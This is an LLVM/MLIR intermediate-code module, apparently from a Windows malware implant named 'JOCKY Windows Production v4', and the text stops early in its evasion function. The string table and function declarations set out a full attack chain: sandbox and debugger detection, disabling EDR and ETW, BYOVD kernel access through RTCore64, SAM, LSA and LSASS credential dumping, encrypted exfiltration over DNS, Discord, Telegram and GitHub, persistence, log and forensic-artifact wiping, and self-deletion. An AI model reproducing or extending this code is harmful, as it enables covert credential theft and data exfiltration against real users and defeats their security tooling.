module attributes {dlti.dl_spec = #dlti.dl_spec<!llvm.ptr<270> = dense<32> : vector<4xi64>, !llvm.ptr<271> = dense<32> : vector<4xi64>, !llvm.ptr<272> = dense<64> : vector<4xi64>, i64 = dense<64> : vector<2xi64>, f80 = dense<128> : vector<2xi64>, !llvm.ptr = dense<64> : vector<4xi64>, i1 = dense<8> : vector<2xi64>, i8 = dense<8> : vector<2xi64>, i16 = dense<16> : vector<2xi64>, i32 = dense<32> : vector<2xi64>, f16 = dense<16> : vector<2xi64>, f64 = dense<64> : vector<2xi64>, f128 = dense<128> : vector<2xi64>, "dlti.endianness" = "little", "dlti.mangling_mode" = "w", "dlti.legal_int_widths" = array<i32: 8, 16, 32, 64>, "dlti.stack_alignment" = 128 : i64>, llvm.module_asm = [], llvm.target_triple = "x86_64-w64-windows-gnu"} {
  llvm.mlir.global private constant @".str.0"("[*] Phase 0: Advanced EDR Evasion (15 Techniques)\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.1"("    [!] Debugger detected - aborting\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.2"("    [+] Debugger check passed\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.3"("    [!] VM detected - adjusting behavior\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.4"("    [!] Sandbox detected - aborting\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.5"("    [+] ETW disabled\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.6"("    [+] EDR callbacks disabled\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.7"("    [+] OB callbacks disabled\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.8"("    [+] MiniFilter callbacks disabled\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.9"("    [+] Windows Defender filter disabled\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.10"("    [+] NTDLL unhooked\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.11"("    [+] Kernel32 unhooked\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.12"("    [+] Direct syscalls enabled\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.13"("    [+] ETW provider patched\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.14"("svchost.exe\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.15"("    [+] Process name spoofed\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.16"("    [+] Hidden from usermode tools\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.17"("[+] EDR Evasion: 11 techniques deployed\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.18"(dense<0> : tensor<1xi8>) {addr_space = 0 : i32, dso_local} : !llvm.array<1 x i8>
  llvm.mlir.global private constant @".str.19"("[*] Phase 1: C2 Bootstrap\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.20"("http://localhost:8443/api/config\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.21"("    [+] PRIMARY C2 responded\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.22"("    [-] Fallback to hardcoded config\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.23"("Bearer_windows_production_v4\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.24"("C:\\Windows\\Temp\\.jocky_model\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.25"("[*] Phase 2: Model Download & Caching\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.26"("    [+] Model cached: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.27"(" bytes\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.28"("    [*] Downloading model from \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.29"("http://localhost:9000/models\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.30"("/\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.31"("phi-3-mini-4k-instruct.gguf\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.32"("    [+] Model downloaded to \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.33"("    [-] Model download failed (non-critical)\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.34"("[*] Phase 3: Data Discovery & Inventory\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.35"("    [+] Found: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.36"("[+] Discovered \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.37"(" data targets\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.38"("[*] Phase 4: Data Collection (6 Sources)\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.39"("C:\\Users\\Public\\Downloads\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.40"("    [+] Downloads: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.41"("C:\\Users\\Public\\Documents\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.42"("    [+] Documents: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.43"("C:\\Users\\Public\\Desktop\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.44"("    [+] Desktop: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.45"("    [+] SAM registry dumped\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.46"("    [+] LSA secrets dumped\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.47"("    [+] Credentials enumerated\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.48"("[+] Data Collection: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.49"(" bytes from 6 sources\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.50"("[*] Phase 5: Data Encryption & Encoding\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.51"("    [+] XOR encryption applied\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.52"("key123\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.53"("    [+] RC4 encryption applied\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.54"("    [+] Data compressed\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.55"("    [+] Base64 encoded: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.56"("[*] Phase 6: Exfiltration (5 Channels)\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.57"("    [!] No data to exfiltrate\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.58"("http://localhost:9000/upload\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.59"("POST\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.60"("    [+] CDN exfiltration successful\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.61"("    [+] DNS tunnel exfiltration successful\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.62"("    [+] Discord exfiltration successful\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.63"("    [+] GitHub exfiltration successful\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.64"("JOCKY\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.65"("    [+] Telegram exfiltration successful\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.66"("[+] Multi-channel exfiltration complete\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.67"("[*] Phase 7: BYOVD Driver Chain (9 Drivers)\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.68"("rtkiow10x64.sys\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.69"("\\\\.\\RTCore64\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.70"("    [+] BYOVD driver loaded - kernel access obtained\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.71"("[-] BYOVD chain exhausted (non-critical)\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.72"("[*] Phase 8: Process Injection (3 Methods)\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.73"("    [+] Process injection methods available\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.74"("[*] Phase 9: Persistence & Registry (6 Methods)\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.75"("    [+] Persistence mechanisms deployed\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.76"("    [+] AmCache patched\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.77"("    [+] ShimCache patched\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.78"("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Browser Helper Objects\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.79"("    [+] Browser extension persistence installed\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.80"("[*] Phase 10: Anti-Forensics (18 Techniques)\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.81"("Security\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.82"("System\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.83"("Application\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.84"("    [+] Event logs cleared\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.85"("    [+] USN Journal cleared\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.86"("    [+] SRUM cleared\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.87"("    [+] PowerShell history wiped\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.88"("    [+] CMD history wiped\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.89"("    [+] Prefetch wiped\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.90"("    [+] Jump lists wiped\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.91"("    [+] Thumbnail cache wiped\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.92"("    [+] Recent files cleared\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.93"("    [+] MFT timestamps cleared\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.94"("chrome\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.95"("    [+] Chrome cache cleared\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.96"("firefox\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.97"("    [+] Firefox cache cleared\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.98"("    [+] Chrome history cleared\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.99"("    [+] Firefox history cleared\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.100"("C:\\Windows\\Temp\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.101"("C:\\Temp\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.102"("    [+] Temp files wiped\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.103"("    [+] ARP cache flushed\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.104"("    [+] DNS cache cleared\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.105"("C:\\Users\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.106"("    [+] User artifacts wiped\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.107"("[+] Anti-forensics complete: 18 cleanup techniques deployed\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.108"("[*] Phase 11: Self-Deletion Protocol\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.109"("    [*] Initiating self-deletion...\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.110"("[+] Binary removed from disk\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.111"("\E2\95\94\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\97\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.112"("\E2\95\91 JOCKY Windows Production v4 - Full Capability             \E2\95\91\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.113"("\E2\95\91 50+ Runtime APIs | Complete EDR Evasion | Auto-Cleanup   \E2\95\91\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.114"("\E2\95\9A\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\90\E2\95\9D\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.115"("[*] Build: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.116"("JOCKY_WINDOWS_PRODUCTION_V4_FULL\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.117"("[*] APIs Used: 50+ across 11 phases\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.118"("[+] Execution complete\00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.119"("[*] Exfiltrated: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.120"("[*] EDR Bypassed: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.121"("[*] Kernel Access: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global private constant @".str.122"("[*] Persistence: \00") {addr_space = 0 : i32, dso_local}
  llvm.mlir.global external @C2_PRIMARY() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @C2_FALLBACK() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @CDN_ENDPOINT() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @MODEL_REPO() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @MODEL_FILE() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @LOCAL_MODEL_PATH() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @BUILD_ID() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @DRIVERS() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @DATA_PATHS() {addr_space = 0 : i32} : !llvm.array<6 x ptr> {
    %0 = llvm.mlir.zero : !llvm.ptr
    %1 = llvm.mlir.undef : !llvm.array<6 x ptr>
    %2 = llvm.insertvalue %0, %1[0] : !llvm.array<6 x ptr> 
    %3 = llvm.insertvalue %0, %2[1] : !llvm.array<6 x ptr> 
    %4 = llvm.insertvalue %0, %3[2] : !llvm.array<6 x ptr> 
    %5 = llvm.insertvalue %0, %4[3] : !llvm.array<6 x ptr> 
    %6 = llvm.insertvalue %0, %5[4] : !llvm.array<6 x ptr> 
    %7 = llvm.insertvalue %0, %6[5] : !llvm.array<6 x ptr> 
    llvm.return %7 : !llvm.array<6 x ptr>
  }
  llvm.mlir.global external @cdn_token() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @model_path() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @collected_data() {addr_space = 0 : i32} : !llvm.ptr {
    %0 = llvm.mlir.zero : !llvm.ptr
    llvm.return %0 : !llvm.ptr
  }
  llvm.mlir.global external @edr_disabled(false) {addr_space = 0 : i32} : i1
  llvm.mlir.global external @kernel_access(false) {addr_space = 0 : i32} : i1
  llvm.mlir.global external @persistence_set(false) {addr_space = 0 : i32} : i1
  llvm.func @puts(!llvm.ptr) -> i32
  llvm.func @printf(!llvm.ptr, ...) -> i32
  llvm.func @println(!llvm.ptr)
  llvm.func @string(i64) -> !llvm.ptr
  llvm.func @jocky_str_concat(!llvm.ptr, !llvm.ptr) -> !llvm.ptr
  llvm.func @malloc(i64) -> !llvm.ptr
  llvm.func @free(!llvm.ptr)
  llvm.func @memset(!llvm.ptr, i32, i64) -> !llvm.ptr
  llvm.func @memcpy(!llvm.ptr, !llvm.ptr, i64) -> !llvm.ptr
  llvm.func @strlen(!llvm.ptr) -> i64
  llvm.func @exit(i32)
  llvm.func @array_len(!llvm.ptr) -> i64
  llvm.func @array_append(!llvm.ptr, !llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_alloc(i64) -> !llvm.ptr
  llvm.func @jocky_free(!llvm.ptr)
  llvm.func @jocky_byovd_new() -> !llvm.ptr
  llvm.func @jocky_byovd_destroy(!llvm.ptr)
  llvm.func @jocky_runtime_init() -> i32
  llvm.func @jocky_check_analysis_environment() -> i32
  llvm.func @jocky_is_debugger_present() -> i1
  llvm.func @jocky_is_vm() -> i1
  llvm.func @jocky_is_sandbox() -> i1
  llvm.func @jocky_sleep_and_recheck()
  llvm.func @jocky_decrypt_xor(!llvm.ptr, i32, i8, i32)
  llvm.func @jocky_decrypt_rc4(!llvm.ptr, i32, !llvm.ptr, i32)
  llvm.func @jocky_unhook_ntdll() -> i1
  llvm.func @jocky_unhook_kernel32() -> i1
  llvm.func @jocky_enable_direct_syscalls() -> i1
  llvm.func @jocky_disable_ob_callbacks() -> i1
  llvm.func @jocky_disable_minifilter_callbacks() -> i1
  llvm.func @jocky_disable_wdfilter() -> i1
  llvm.func @jocky_patch_etw_provider() -> i1
  llvm.func @jocky_spoof_process_name(!llvm.ptr) -> i1
  llvm.func @jocky_hide_from_usermode() -> i1
  llvm.func @jocky_disable_etw(!llvm.ptr) -> i1
  llvm.func @jocky_disable_edr_callbacks(!llvm.ptr) -> i32
  llvm.func @jocky_spoof_call(!llvm.ptr, i64, i64, i64, i64) -> i64
  llvm.func @jocky_spoof_syscall(i32, i64, i64, i64, i64) -> i64
  llvm.func @jocky_byovd_load(!llvm.ptr, !llvm.ptr, !llvm.ptr) -> i1
  llvm.func @jocky_byovd_unload(!llvm.ptr)
  llvm.func @jocky_driver_read_phys(!llvm.ptr, i64, !llvm.ptr, i32) -> i1
  llvm.func @jocky_driver_write_phys(!llvm.ptr, i64, !llvm.ptr, i32) -> i1
  llvm.func @jocky_driver_map_kernel(!llvm.ptr, i64, i32) -> !llvm.ptr
  llvm.func @jocky_elevate_token(!llvm.ptr, i32) -> i1
  llvm.func @jocky_process_hollow(!llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_rdll_inject(i32, !llvm.ptr, i32) -> i1
  llvm.func @jocky_exfil_encrypt(!llvm.ptr, i32, !llvm.ptr, i32)
  llvm.func @jocky_exfil_front(!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_exfil_dns(!llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_exfil_discord(!llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_exfil_telegram(!llvm.ptr, !llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_exfil_github(!llvm.ptr, !llvm.ptr, !llvm.ptr, i32) -> i1
  llvm.func @jocky_self_delete()
  llvm.func @jocky_clear_logs()
  llvm.func @jocky_wipe_artifacts(!llvm.ptr)
  llvm.func @jocky_wipe_prefetch()
  llvm.func @jocky_patch_shimcache() -> i1
  llvm.func @jocky_patch_amcache() -> i1
  llvm.func @jocky_clear_srum() -> i1
  llvm.func @jocky_cleanup_all()
  llvm.func @forensics_wipe_powershell_history() -> i32
  llvm.func @forensics_wipe_cmd_history() -> i32
  llvm.func @forensics_flush_arp_cache() -> i32
  llvm.func @forensics_clear_dns_cache() -> i32
  llvm.func @jocky_cleanup_event_logs(!llvm.ptr) -> i32
  llvm.func @jocky_cleanup_usn_journal() -> i32
  llvm.func @fs_exists(!llvm.ptr) -> i1
  llvm.func @fs_list_files(!llvm.ptr, i1) -> !llvm.ptr
  llvm.func @fs_file_size(!llvm.ptr) -> i64
  llvm.func @fs_read_file(!llvm.ptr) -> !llvm.ptr
  llvm.func @fs_write_file(!llvm.ptr, !llvm.ptr, i64) -> i1
  llvm.func @crypto_generate_key(i32) -> !llvm.ptr
  llvm.func @crypto_aes256_encrypt(!llvm.ptr, i32, !llvm.ptr) -> !llvm.ptr
  llvm.func @crypto_aes256_decrypt(!llvm.ptr, i32, !llvm.ptr) -> !llvm.ptr
  llvm.func @sandbox_spawn(!llvm.ptr, !llvm.ptr) -> i32
  llvm.func @sandbox_set_limits(i32, i64, i32, i64) -> i1
  llvm.func @sandbox_monitor(i32) -> i32
  llvm.func @sandbox_wait(i32) -> i32
  llvm.func @sandbox_export_trace(i32, !llvm.ptr) -> i1
  llvm.func @jocky_registry_create_key(i32, !llvm.ptr, !llvm.ptr) -> i1
  llvm.func @jocky_registry_set_value(!llvm.ptr, !llvm.ptr, !llvm.ptr, i32, i32) -> i1
  llvm.func @jocky_registry_close_key(!llvm.ptr) -> i1
  llvm.func @audit_log(!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr)
  llvm.func @audit_init(i32) -> i1
  llvm.func @audit_export(!llvm.ptr) -> i1
  llvm.func @audit_verify() -> i32
  llvm.func @provenance_record(!llvm.ptr, !llvm.ptr, !llvm.ptr)
  llvm.func @ai_init() -> i32
  llvm.func @ai_collect_telemetry() -> !llvm.ptr
  llvm.func @ai_score_threat() -> f64
  llvm.func @byovd_load_driver(!llvm.ptr) -> i32
  llvm.func @byovd_test_exploit(i32) -> i32
  llvm.func @btr_disable_notifications() -> i1
  llvm.func @btr_mask_module(!llvm.ptr) -> i1
  llvm.func @jocky_exploit_disable_callbacks() -> i32
  llvm.func @jocky_exploit_token_replacement(i32, i32) -> i32
  llvm.func @edrhoker_detect() -> i1
  llvm.func @blindside_unhook_ntdll() -> i1
  llvm.func @exfil_dns_tunnel(!llvm.ptr, !llvm.ptr) -> i32
  llvm.func @exfil_discord_webhook(!llvm.ptr, !llvm.ptr) -> i32
  llvm.func @exfil_local_cdn(!llvm.ptr, !llvm.ptr, !llvm.ptr, !llvm.ptr) -> i32
  llvm.func @jocky_http_get(!llvm.ptr, !llvm.ptr, i64) -> i64
  llvm.func @jocky_http_post(!llvm.ptr, !llvm.ptr, i32, !llvm.ptr) -> i1
  llvm.func @jocky_download_file(!llvm.ptr, !llvm.ptr) -> i1
  llvm.func @jocky_compress_data(!llvm.ptr, i32) -> !llvm.ptr
  llvm.func @jocky_decompress_data(!llvm.ptr, i32) -> !llvm.ptr
  llvm.func @jocky_registry_enum_keys(i32, !llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_registry_enum_values(i32, !llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_registry_get_value(i32, !llvm.ptr, !llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_registry_dump_sam() -> i32
  llvm.func @jocky_registry_dump_security() -> i32
  llvm.func @jocky_registry_dump_lsa_secrets() -> i32
  llvm.func @jocky_registry_delete_key(i32, !llvm.ptr) -> i1
  llvm.func @jocky_wipe_jumplist() -> i1
  llvm.func @jocky_wipe_thumbcache() -> i1
  llvm.func @jocky_clear_recent_files() -> i1
  llvm.func @jocky_clear_mft_timestamps() -> i1
  llvm.func @jocky_wipe_free_space() -> i1
  llvm.func @jocky_wipe_temp_files(!llvm.ptr, !llvm.ptr) -> i1
  llvm.func @jocky_clear_browser_cache(!llvm.ptr) -> i1
  llvm.func @jocky_clear_browser_history(!llvm.ptr) -> i1
  llvm.func @jocky_cron_install(!llvm.ptr, !llvm.ptr) -> i1
  llvm.func @jocky_systemd_install(!llvm.ptr, !llvm.ptr) -> i1
  llvm.func @jocky_cron_remove(!llvm.ptr) -> i1
  llvm.func @jocky_systemd_remove(!llvm.ptr) -> i1
  llvm.func @jocky_linux_cleanup_audit() -> i32
  llvm.func @jocky_linux_cleanup_wtmp() -> i32
  llvm.func @jocky_linux_cleanup_lastlog() -> i32
  llvm.func @jocky_thread_get_info(i32) -> !llvm.ptr
  llvm.func @jocky_module_info(!llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_lsass_dump() -> i32
  llvm.func @jocky_credentials_enumerate() -> !llvm.ptr
  llvm.func @jocky_token_enumerate() -> !llvm.ptr
  llvm.func @jocky_impersonate_user(!llvm.ptr, !llvm.ptr, !llvm.ptr) -> i1
  llvm.func @jocky_data_base64_encode(!llvm.ptr, i32) -> !llvm.ptr
  llvm.func @jocky_data_base64_decode(!llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_data_hex_encode(!llvm.ptr, i32) -> !llvm.ptr
  llvm.func @jocky_data_hex_decode(!llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_ai_init() -> i1
  llvm.func @jocky_ai_get_threat_level() -> i32
  llvm.func @jocky_driver_score_composite(!llvm.ptr) -> i32
  llvm.func @jocky_driver_select_best(i32) -> !llvm.ptr
  llvm.func @jocky_driver_get_fallback_chain(i32, !llvm.ptr) -> !llvm.ptr
  llvm.func @jocky_edr_profiler_init() -> !llvm.ptr
  llvm.func @jocky_edr_profiler_record_callback(!llvm.ptr)
  llvm.func @jocky_edr_profiler_analyze(!llvm.ptr) -> i32
  llvm.func @jocky_edr_get_syscall_delay(i32) -> i32
  llvm.func @jocky_edr_should_reduce_syscalls(i32) -> i1
  llvm.func @jocky_edr_should_batch_operations(i32) -> i1
  llvm.func @jocky_edr_profiler_shutdown(!llvm.ptr)
  llvm.func @phase_evasion() -> i1 {
    %0 = llvm.mlir.constant(1 : i32) : i32
    %1 = llvm.mlir.addressof @".str.0" : !llvm.ptr
    %2 = llvm.mlir.constant(0 : i32) : i32
    %3 = llvm.mlir.addressof @".str.2" : !llvm.ptr
    %4 = llvm.mlir.addressof @".str.3" : !llvm.ptr
    %5 = llvm.mlir.zero : !llvm.ptr
    %6 = llvm.mlir.addressof @".str.5" : !llvm.ptr
    %7 = llvm.mlir.addressof @".str.6" : !llvm.ptr
    %8 = llvm.mlir.constant(true) : i1
    %9 = llvm.mlir.addressof @edr_disabled : !llvm.ptr
    %10 = llvm.mlir.addressof @".str.7" : !llvm.ptr
    %11 = llvm.mlir.addressof @".str.8" : !llvm.ptr
    %12 = llvm.mlir.addressof @".str.9" : !llvm.ptr
    %13 = llvm.mlir.addressof @".str.10" : !llvm.ptr
    %14 = llvm.mlir.addressof @".str.11" : !llvm.ptr
    %15 = llvm.mlir.addressof @".str.12" : !llvm.ptr
